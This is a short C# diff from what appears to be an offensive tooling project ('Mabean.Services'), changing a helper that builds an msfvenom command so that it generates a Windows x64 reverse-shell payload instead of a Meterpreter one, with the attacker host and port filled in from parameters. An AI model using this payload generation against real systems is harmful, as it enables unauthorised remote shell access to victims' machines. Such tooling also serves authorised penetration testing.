@@ -71,7 +71,7 @@ namespace Mabean.Services
 
         private static string BuildMsfvenomCommand(string lhost, string lport)
         {
-            return $"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw";
+            return $"msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f raw";
         }
 
         public void Dispose()
